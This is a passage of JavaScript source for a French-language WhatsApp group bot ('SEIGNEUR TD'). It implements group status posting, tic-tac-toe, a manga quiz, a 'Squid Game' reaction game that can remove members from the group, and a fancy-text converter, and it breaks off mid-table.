async function handleToSGroup(sock, args, message, remoteJid, senderJid, isGroup) {
  try {
    if (!isGroup) {
      await sock.sendMessage(remoteJid, { text: `❌ Cette commande fonctionne uniquement dans un groupe.\n\n*© SEIGNEUR TD*` });
      return;
    }
    const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const text = args.join(' ');
    const _send = sock._origSend || sock.sendMessage.bind(sock);

    // Statut image
    if (quotedMsg?.imageMessage) {
      const imgData = quotedMsg.imageMessage;
      const stream = await downloadContentFromMessage(imgData, 'image');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement image !' }); return;
      }
      const caption = text || imgData.caption || '';
      await sock.sendMessage(remoteJid, {
        groupStatusMessage: {
          image: buffer,
          caption: caption,
          mimetype: imgData.mimetype || 'image/jpeg'
        }
      });
      await sock.sendMessage(remoteJid, { text: `🖼️ IMAGE POSTÉE AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut vidéo
    if (quotedMsg?.videoMessage) {
      const vidData = quotedMsg.videoMessage;
      const stream = await downloadContentFromMessage(vidData, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement vidéo !' }); return;
      }
      await sock.sendMessage(remoteJid, {
        groupStatusMessage: {
          video: buffer,
          caption: text || '',
          mimetype: vidData.mimetype || 'video/mp4'
        }
      });
      await sock.sendMessage(remoteJid, { text: `🎥 VIDÉO POSTÉE AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut audio
    if (quotedMsg?.audioMessage) {
      const audData = quotedMsg.audioMessage;
      const stream = await downloadContentFromMessage(audData, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement audio !' }); return;
      }
      await _send(remoteJid, {
        groupStatusMessage: {
          audio: buffer,
          mimetype: 'audio/mp4',
          ptt: true
        }
      });
      await sock.sendMessage(remoteJid, { text: `🎵 AUDIO POSTÉ AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut texte
    if (text) {
      const colors = ['#FF5733','#33FF57','#3357FF','#FF33A8','#FFD700','#00CED1'];
      const bgColor = colors[Math.floor(Math.random() * colors.length)];
      await _send(remoteJid, {
        groupStatusMessage: {
          text: text,
          backgroundColor: bgColor,
          font: Math.floor(Math.random() * 5)
        }
      });
      await sock.sendMessage(remoteJid, { text: `✍️ TEXTE POSTÉ AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📢 *ToSGroup — Statut de groupe*\n\nUsage:\n• ${config.prefix}tosgroup [texte]\n• Réponds à une image + ${config.prefix}tosgroup\n• Réponds à une vidéo + ${config.prefix}tosgroup\n• Réponds à un audio + ${config.prefix}tosgroup\n\n*© SEIGNEUR TD*`
    });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}\n\n*© SEIGNEUR TD*` });
  }
}
// =============================================
// 🎮 SYSTÈME DE JEUX
// =============================================

// ─── État global des jeux ─────────────────────────────────────────────────
const gameState = new Map(); // remoteJid → { type, data }

// ─── Dispatcher réactions jeux ────────────────────────────────────────────
async function handleGameReaction(sock, message, messageText, remoteJid, senderJid) {
  const state = gameState.get(remoteJid);
  if (!state) return;

  if (state.type === 'tictactoe') {
    await processTTTMove(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'quiz') {
    await processQuizAnswer(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'squidgame') {
    await processSquidReaction(sock, message, messageText, remoteJid, senderJid, state);
  }
}

// =============================================
// ❌⭕ TIC-TAC-TOE
// =============================================
const TTT_EMPTY = '⬜';
const TTT_X     = '❌';
const TTT_O     = '⭕';

function renderTTTBoard(board) {
  return board.reduce((str, cell, i) => str + cell + (i % 3 === 2 ? '\n' : ''), '');
}

function checkTTTWin(board, mark) {
  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  return wins.some(([a,b,c]) => board[a]===mark && board[b]===mark && board[c]===mark);
}

async function handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Si partie en cours
  if (existing?.type === 'tictactoe') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A TicTacToe game is already in progress!\n\n${renderTTTBoard(existing.data.board)}\nType a number *1-9* to play.\n\n_${config.prefix}ttt stop → abandon_`
    });
    return;
  }

  // Stop la partie
  if (args[0] === 'stop') {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, { text: '🛑 TicTacToe game abandoned.' });
    return;
  }

  // Démarrer
  const player1 = senderJid;
  const player2 = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!player2) {
    await sock.sendMessage(remoteJid, {
      text: `❌⭕ *TIC-TAC-TOE*\n\nUsage: ${config.prefix}tictactoe @adversaire\n\nMention a player to start!\n\nDuring the game, type a number:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣`,
      mentions: []
    });
    return;
  }

  const board = Array(9).fill(TTT_EMPTY);
  gameState.set(remoteJid, {
    type: 'tictactoe',
    data: {
      board,
      players: [player1, player2],
      marks:   [TTT_X, TTT_O],
      turn: 0,
      startTime: Date.now()
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `❌⭕ *TIC-TAC-TOE COMMENCE!*\n\n` +
      `👤 Joueur 1: @${player1.split('@')[0]} → ❌\n` +
      `👤 Joueur 2: @${player2.split('@')[0]} → ⭕\n\n` +
      `${renderTTTBoard(board)}\n` +
      `*Position:*\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n` +
      `@${player1.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [player1, player2]
  });
}

async function processTTTMove(sock, message, text, remoteJid, senderJid, state) {
  const { board, players, marks, turn } = state.data;
  const currentPlayer = players[turn];
  const currentMark   = marks[turn];

  if (senderJid !== currentPlayer) return; // Pas ton tour

  const pos = parseInt(text.trim()) - 1;
  if (isNaN(pos) || pos < 0 || pos > 8) return;
  if (board[pos] !== TTT_EMPTY) {
    await sock.sendMessage(remoteJid, { text: '⚠️ That cell is already taken!' });
    return;
  }

  board[pos] = currentMark;

  if (checkTTTWin(board, currentMark)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🏆 *@${currentPlayer.split('@')[0]} GAGNE!* ${currentMark}\n\nFélicitations! 🎉`,
      mentions: [currentPlayer]
    });
    return;
  }

  if (board.every(c => c !== TTT_EMPTY)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🤝 *DRAW!*\nGood game to both of you!`
    });
    return;
  }

  const nextTurn = turn === 0 ? 1 : 0;
  state.data.turn = nextTurn;
  const nextPlayer = players[nextTurn];

  await sock.sendMessage(remoteJid, {
    text: `${renderTTTBoard(board)}\n\n@${nextPlayer.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [nextPlayer]
  });
}

// =============================================
// 🍥 QUIZ MANGA
// =============================================
const QUIZ_MANGA = [
  { q: '🍥 Dans quel anime le personnage Naruto Uzumaki est-il le héros principal?', a: 'naruto', hint: 'C\'est le titre de l\'anime!' },
  { q: '⚔️ Quel est le pouvoir signature de Goku dans Dragon Ball?', a: 'kamehameha', hint: 'K-A-M-E...' },
  { q: '👁️ Comment s\'appelle le pouvoir oculaire de Sasuke?', a: 'sharingan', hint: 'Commence par S' },
  { q: '💀 Dans One Piece, comment s\'appelle le chapeau de paille emblématique de Luffy?', a: 'chapeau de paille', hint: 'C\'est son surnom!' },
  { q: '🗡️ Dans Demon Slayer, quel est le style de respiration principal de Tanjiro?', a: 'eau', hint: 'Un élément liquide' },
  { q: '⚡ Dans Attack on Titan, comment s\'appelle le titan colossal de Bertholdt?', a: 'titan colossal', hint: 'Il est très grand' },
  { q: '🏴‍☠️ Quel est le vrai nom de Zoro dans One Piece?', a: 'roronoa zoro', hint: 'Son nom de famille commence par R' },
  { q: '🔮 Dans Hunter x Hunter, comment s\'appelle l\'énergie vitale que les personnages utilisent?', a: 'nen', hint: '3 lettres' },
  { q: '🌊 Dans My Hero Academia, quel est le Quirk de Midoriya?', a: 'one for all', hint: 'Héritage de All Might' },
  { q: '🌙 Dans Bleach, comment s\'appelle l\'épée spirituelle d\'Ichigo?', a: 'zangetsu', hint: 'Tranche la lune' },
  { q: '🔥 Quel anime suit Tanjiro Kamado chassant des démons pour sauver sa sœur?', a: 'demon slayer', hint: 'Kimetsu no Yaiba' },
  { q: '💥 Dans One Punch Man, pourquoi Saitama est-il devenu chauve?', a: 'entrainement', hint: 'Il a trop...' },
  { q: '🃏 Dans Death Note, quel est le nom du carnet magique?', a: 'death note', hint: 'Le titre de l\'anime!' },
  { q: '🐉 Dans Fairy Tail, quel est le pouvoir de Natsu Dragneel?', a: 'flamme', hint: 'Très chaud!' },
  { q: '⚙️ Dans Fullmetal Alchemist, quels sont les frères Elric?', a: 'edward et alphonse', hint: 'Ed et Al' },
];

async function handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Stop
  if (args[0] === 'stop') {
    if (existing?.type === 'quiz') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Quiz arrêté!\n\n📊 *Score final:*\n' + formatQuizScores(existing.data.scores) });
    } else {
      await sock.sendMessage(remoteJid, { text: '❌ No quiz in progress.' });
    }
    return;
  }

  // Partie déjà en cours
  if (existing?.type === 'quiz') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A quiz is already in progress!\n\n❓ ${existing.data.current.q}\n\n_${config.prefix}quiz stop → stop_`
    });
    return;
  }

  // Nombre de questions
  const total = Math.min(parseInt(args[0]) || 10, 15);
  const questions = [...QUIZ_MANGA].sort(() => Math.random() - 0.5).slice(0, total);

  gameState.set(remoteJid, {
    type: 'quiz',
    data: {
      questions,
      index: 0,
      current: questions[0],
      scores: {},
      total,
      startTime: Date.now(),
      hintUsed: false
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `🍥 *QUIZ MANGA COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📚 *${total} questions* sur les mangas!\nAnswer in chat — first to answer correctly wins the point!\n\n_${config.prefix}quiz stop → stop_\n\n━━━━━━━━━━━━━━━━━━━━━━━\n\n❓ *Question 1/${total}:*\n${questions[0].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint (-1 pt)_`
  });

  // Timer 30s par question
  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up! No one found it.'), 30000);
}

function formatQuizScores(scores) {
  if (Object.keys(scores).length === 0) return '_No points scored_';
  return Object.entries(scores)
    .sort(([,a],[,b]) => b - a)
    .map(([jid, pts], i) => `${i===0?'🥇':i===1?'🥈':'🥉'} @${jid.split('@')[0]}: ${pts} pt(s)`)
    .join('\n');
}

async function advanceQuizQuestion(sock, remoteJid, prefix = '') {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'quiz') return;

  const { questions, index, total, scores } = state.data;
  const nextIndex = index + 1;

  if (nextIndex >= total) {
    // Fin du quiz
    gameState.delete(remoteJid);
    const winner = Object.entries(scores).sort(([,a],[,b]) => b-a)[0];
    await sock.sendMessage(remoteJid, {
      text: `${prefix ? prefix + '\n\n' : ''}🏁 *FIN DU QUIZ MANGA!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📊 *Final ranking:*\n${formatQuizScores(scores)}\n\n${winner ? `🏆 Winner: @${winner[0].split('@')[0]} with ${winner[1]} point(s)!` : 'No winner!'}`,
      mentions: winner ? [winner[0]] : []
    });
    return;
  }

  state.data.index    = nextIndex;
  state.data.current  = questions[nextIndex];
  state.data.hintUsed = false;

  await sock.sendMessage(remoteJid, {
    text: `${prefix ? prefix + '\n\n' : ''}❓ *Question ${nextIndex+1}/${total}:*\n${questions[nextIndex].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint_`
  });

  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up!'), 30000);
}

async function processQuizAnswer(sock, message, text, remoteJid, senderJid, state) {
  const { current, hintUsed, scores } = state.data;
  const prefix = config.prefix;

  // Indice
  if (text.toLowerCase() === `${prefix}hint` || text.toLowerCase() === prefix + 'hint') {
    if (!hintUsed) {
      state.data.hintUsed = true;
      await sock.sendMessage(remoteJid, { text: `💡 *Hint:* ${current.hint}` });
    }
    return;
  }

  // Vérifier réponse
  if (text.toLowerCase().trim() === current.a.toLowerCase()) {
    scores[senderJid] = (scores[senderJid] || 0) + (hintUsed ? 0.5 : 1);
    const pts = scores[senderJid];
    await sock.sendMessage(remoteJid, {
      text: `✅ *CORRECT ANSWER!*\n🎉 @${senderJid.split('@')[0]} → +${hintUsed?'0.5':'1'} pt (Total: ${pts})\n\n📖 Answer: *${current.a}*`,
      mentions: [senderJid]
    });
    await advanceQuizQuestion(sock, remoteJid);
  }
}

// =============================================
// 🦑 SQUID GAME
// =============================================
const SQUID_ROUNDS = [
  { name: '🔴 Feu Rouge / 🟢 Feu Vert', instruction: '🟢 = *AVANCER*  |  🔴 = *RESTER IMMOBILE*\n\nRéagissez with 🟢 pour avancer et survivre!', target: '🟢', wrong: '🔴', duration: 25000 },
  { name: '🍬 Dalgona Challenge', instruction: '🟢 = *DÉCOUPER AVEC SOIN*  |  🔴 = *TROP RAPIDE (éliminé)*\n\nRéagissez with 🟢 pour réussir!', target: '🟢', wrong: '🔴', duration: 20000 },
  { name: '🪆 Marbles Game', instruction: '🟢 = *JOUER*  |  🔴 = *ABANDONNER*\n\nRéagissez with 🟢 pour continuer!', target: '🟢', wrong: '🔴', duration: 30000 },
  { name: '🌉 Glass Bridge', instruction: '🟢 = *VERRE SOLIDE*  |  🔴 = *VERRE FRAGILE (mort)*\n\nRéagissez with 🟢 pour traverser!', target: '🟢', wrong: '🔴', duration: 15000 },
  { name: '🗡️ Round Final - Squid Game', instruction: '🟢 = *ATTAQUER*  |  🔴 = *DÉFENDRE*\n\nRéagissez with 🟢 pour gagner le round final!', target: '🟢', wrong: '🔴', duration: 20000 },
];

async function handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Squid Game → groups only!' });
    return;
  }

  const existing = gameState.get(remoteJid);
  if (existing?.type === 'squidgame') {
    if (args[0] === 'stop') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Squid Game arrêté par l\'admin.' });
      return;
    }
    await sock.sendMessage(remoteJid, { text: `⚠️ A Squid Game is already in progress!\n_${config.prefix}squidgame stop → stop_` });
    return;
  }

  // Récupérer tous les participants du groupe
  let participants = [];
  try {
    const meta = await sock.groupMetadata(remoteJid);
    participants = meta.participants.map(p => p.id).filter(id => id !== sock.user?.id && id !== senderJid);
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: '❌ Unable to fetch group members.' });
    return;
  }

  if (participants.length < 4) {
    await sock.sendMessage(remoteJid, { text: '❌ At least 4 members needed to play!' });
    return;
  }

  // Init état
  gameState.set(remoteJid, {
    type: 'squidgame',
    data: {
      players: new Set(participants),     // players still alive
      eliminated: new Set(),              // eliminated
      roundIndex: 0,
      reactions: new Map(),               // senderJid → emoji
      roundActive: false,
      host: senderJid,
      startTime: Date.now()
    }
  });

  const mentions = participants.slice(0, 20); // max 20 mentions
  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👥 *${participants.length} participant(s)* enregistrés!\n` +
      `🎯 Survive all rounds to win!\n\n` +
      `📋 *Règles:*\n` +
      `• Réagissez with le bon emoji quand demandé\n` +
      `• 🟢 = Good action | 🔴 = Wrong action\n` +
      `• Si 3 rounds without reaction → 10 players kicked\n` +
      `• 4 good reactions = round protection\n\n` +
      `⏳ *Round 1 starts in 5 seconds...*\n\n` +
      `${participants.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  setTimeout(() => startSquidRound(sock, remoteJid), 5000);
}

async function startSquidRound(sock, remoteJid) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  const { roundIndex, players, eliminated } = state.data;

  if (roundIndex >= SQUID_ROUNDS.length || players.size === 0) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  const round = SQUID_ROUNDS[roundIndex];
  state.data.reactions  = new Map();
  state.data.roundActive = true;

  const alive = [...players];
  const mentions = alive.slice(0, 20);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *ROUND ${roundIndex + 1}: ${round.name}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${round.instruction}\n\n` +
      `👥 Players remaining: *${players.size}*\n` +
      `⏱️ You have *${round.duration / 1000} seconds!*\n\n` +
      `${alive.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  // Timer de fin de round
  setTimeout(() => endSquidRound(sock, remoteJid, round), round.duration);
}

async function processSquidReaction(sock, message, text, remoteJid, senderJid, state) {
  const { roundActive, players, reactions } = state.data;
  if (!roundActive) return;
  if (!players.has(senderJid)) return; // Déjà éliminé

  const emoji = text.trim();
  if (emoji === '🟢' || emoji === '🔴') {
    reactions.set(senderJid, emoji);
  }
}

async function endSquidRound(sock, remoteJid, round) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  state.data.roundActive = false;
  const { players, reactions, eliminated, roundIndex } = state.data;

  const goodReactions  = [...reactions.entries()].filter(([,e]) => e === round.target).map(([j]) => j);
  const wrongReactions = [...reactions.entries()].filter(([,e]) => e === round.wrong).map(([j]) => j);
  const noReaction     = [...players].filter(j => !reactions.has(j));

  // Éliminer ceux qui ont réagi with le mauvais emoji
  wrongReactions.forEach(j => { players.delete(j); eliminated.add(j); });

  let resultText = `📊 *RÉSULTAT ROUND ${roundIndex + 1}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  resultText += `✅ Good reactions: *${goodReactions.length}*\n`;
  resultText += `❌ Wrong reactions: *${wrongReactions.length}*\n`;
  resultText += `😶 No reaction: *${noReaction.length}*\n\n`;

  // Règle: si 0 bonne réaction sur 3 rounds consécutifs → expulser 10
  state.data.noReactionStreak = (state.data.noReactionStreak || 0);
  if (goodReactions.length === 0) {
    state.data.noReactionStreak++;
    if (state.data.noReactionStreak >= 3) {
      // Expulser 10 joueurs aléatoires
      const toKick = [...players].sort(() => Math.random() - 0.5).slice(0, Math.min(10, players.size));
      toKick.forEach(j => { players.delete(j); eliminated.add(j); });
      resultText += `☠️ *3 rounds without reaction! 10 players kicked!*\n`;
      resultText += toKick.map(j => `• @${j.split('@')[0]}`).join('\n') + '\n\n';
      state.data.noReactionStreak = 0;

      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          for (const jid of toKick) {
            await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
            await delay(500);
          }
        }
      } catch(e) {}
    }
  } else if (goodReactions.length >= 4) {
    // Protection: les 4+ premiers protégés ce round
    state.data.noReactionStreak = 0;
    resultText += `🛡️ *${goodReactions.length} joueurs ont réagi correctement → protégés ce round!*\n\n`;
  } else {
    state.data.noReactionStreak = 0;
  }

  // Expulser les mauvaises réactions du groupe
  if (wrongReactions.length > 0) {
    try {
      const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
      if (botIsAdmin) {
        for (const jid of wrongReactions) {
          await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
          await delay(500);
        }
      }
    } catch(e) {}
    resultText += `🚪 *Eliminated:*\n${wrongReactions.map(j => `• @${j.split('@')[0]}`).join('\n')}\n\n`;
  }

  resultText += `👥 *Survivors: ${players.size}*\n`;

  const allMentions = [...goodReactions, ...wrongReactions, ...noReaction].slice(0, 20);
  await sock.sendMessage(remoteJid, { text: resultText, mentions: allMentions });

  state.data.roundIndex++;

  if (players.size <= 1) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  await delay(4000);
  await startSquidRound(sock, remoteJid);
}

async function endSquidGame(sock, remoteJid, state) {
  gameState.delete(remoteJid);
  const { players, eliminated } = state.data;

  const winners = [...players];
  const winMentions = winners.slice(0, 10);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME TERMINÉ!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${winners.length > 0
        ? `🏆 *${winners.length} GAGNANT(S):*\n${winners.map(j => `👑 @${j.split('@')[0]}`).join('\n')}`
        : '☠️ *Tous les joueurs ont été eliminated!*'
      }\n\n` +
      `📊 Eliminated: ${eliminated.size}\n` +
      `🎮 Rounds joués: ${state.data.roundIndex}\n\n` +
      `_Thanks for playing Squid Game!_ 🦑`,
    mentions: winMentions
  });
}

// =============================================
// 🖼️ SYSTÈME D'IMAGES PAR COMMANDE
// =============================================
// Place une image dans le dossier du bot nommée:
//   ping.jpg, alive.jpg, info.jpg, sticker.jpg...
// Le bot l'enverra automatiquement en caption!
// Formats supportés: .jpg .jpeg .png .gif .webp
// =============================================

// =============================================
// 🔧 BUILD META QUOTE — Crée un message cité stylé
// =============================================
function buildMetaQuote(latencyMs = null) {
  return null;
}

// =============================================
// 🏅 BADGE CONTEXT — Contexte avec badge stylé
// =============================================
function buildBadgeCtx() {
  const BADGE_CTX = {
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363422398514286@newsletter',
      serverMessageId: 1,
      newsletterName: 'SEIGNEUR TD'
    }
  };
  return BADGE_CTX;
}

async function sendWithImage(sock, remoteJid, cmdName, text, mentions = [], latencyMs = null) {
  const videoExts = ['.mp4','.mov','.mkv'], imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
  let mediaPath = null, mediaType = null;
  for (const ext of videoExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='video';break;} }
  if (!mediaPath) { for (const ext of imageExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='image';break;} } }

  const mq = buildMetaQuote(latencyMs);
  const badge = buildBadgeCtx();
  const sendOpts = mq ? { quoted: mq } : {};

  let sentMsg;
  try {
    if (mediaPath && mediaType === 'video') {
      sentMsg = await sock.sendMessage(remoteJid, {
        video: fs.readFileSync(mediaPath),
        caption: text,
        gifPlayback: false,
        mentions,
        contextInfo: badge,
      }, sendOpts);
    } else if (mediaPath && mediaType === 'image') {
      sentMsg = await sock.sendMessage(remoteJid, {
        image: fs.readFileSync(mediaPath),
        caption: text,
        mentions,
        contextInfo: badge,
      }, sendOpts);
    } else {
      sentMsg = await sock.sendMessage(remoteJid, {
        text,
        mentions,
        contextInfo: badge,
      }, sendOpts);
    }
  } catch(e) {
    try { sentMsg = await sock.sendMessage(remoteJid, { text, mentions }); } catch(e2) {}
  }

  sendCmdAudio(sock, remoteJid).catch(() => {});
  return sentMsg;
}

// =============================================
// ✨ COMMANDE FANCY — Convertir texte en styles
// Usage: !fancy [numéro] [texte]
//        !fancy [texte]  → liste tous les styles
// =============================================
async function handleFancy(sock, args, remoteJid, senderJid) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *FANCY - Styles de texte*\n\nUsage:\n• ${config.prefix}fancy [texte] → voir tous les styles\n• ${config.prefix}fancy [numéro] [texte] → style spécifique\n\nEx: ${config.prefix}fancy SEIGNEUR TD\nEx: ${config.prefix}fancy 10 SEIGNEUR TD`
    });
    return;
  }

  // Détecter si le premier arg est un numéro
  const firstArg = args[0];
  let styleNum = parseInt(firstArg);
  let text;

  if (!isNaN(styleNum) && args.length > 1) {
    text = args.slice(1).join(' ');
  } else {
    styleNum = null;
    text = args.join(' ');
  }

  // Table de conversion lettre → fancy par style
  // Chaque style a un mapping complet A-Z a-z 0-9
  function applyStyle(text, styleIndex) {
    const styles = [
      // 1 - ຊ໐k໐น style Thai/Lao
      { map: {'a':'ส','b':'ც','c':'ċ','d':'ɗ','e':'ε','f':'ƒ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'๓','n':'ŋ','o':'໐','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'น','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'ส','B':'ც','C':'Ċ','D':'Ɗ','E':'Ε','F':'Ƒ','G':'Ɠ','H':'Ɦ','I':'I','J':'ʝ','K':'Ƙ','L':'Ⴊ','M':'๓','N':'Ŋ','O':'໐','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'น','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 2 - ʑơƙơų style
      { map: {'a':'ą','b':'ɓ','c':'ƈ','d':'ɗ','e':'ɛ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'ɱ','n':'ŋ','o':'ơ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'ų','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɗ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ƙ','L':'ʟ','M':'ɱ','N':'Ŋ','O':'Ơ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'Ų','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 3 - 乙のズのひ Japanese
      { map: {'a':'ά','b':'乃','c':'ς','d':'∂','e':'ε','f':'ƒ','g':'g','h':'ん','i':'ι','j':'j','k':'ズ','l':'ℓ','m':'ﾶ','n':'η','o':'の','p':'ρ','q':'q','r':'尺','s':'丂','t':'τ','u':'ひ','v':'ν','w':'ω','x':'χ','y':'ソ','z':'乙','A':'ά','B':'乃','C':'ς','D':'∂','E':'Ε','F':'Ƒ','G':'G','H':'ん','I':'ι','J':'J','K':'ズ','L':'ℓ','M':'ﾶ','N':'η','O':'の','P':'Ρ','Q':'Q','R':'尺','S':'丂','T':'τ','U':'ひ','V':'Ν','W':'Ω','X':'Χ','Y':'ソ','Z':'乙'} },
      // 4 - 乙ㄖҜㄖㄩ Leet/Kanji
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᗴ','f':'ᖴ','g':'Ǥ','h':'ᕼ','i':'ι','j':'ᒍ','k':'Ҝ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'ㄖ','p':'ᑭ','q':'Ƣ','r':'ᖇ','s':'Ş','t':'ƬΉΣ','u':'ᑌ','v':'᙮᙮','w':'ᗯ','x':'᙭','y':'ƳΘᑌ','z':'乙','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᗴ','F':'ᖴ','G':'Ǥ','H':'ᕼ','I':'ι','J':'ᒍ','K':'Ҝ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'ㄖ','P':'ᑭ','Q':'Ƣ','R':'ᖇ','S':'Ş','T':'Ƭ','U':'ᑌ','V':'᙮᙮','W':'ᗯ','X':'᙭','Y':'Ƴ','Z':'乙'} },
      // 5 - 🅉🄾🄺🄾🅄 Enclosed letters
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 6 - ፚᎧᏦᎧᏬ Ethiopian/Cherokee
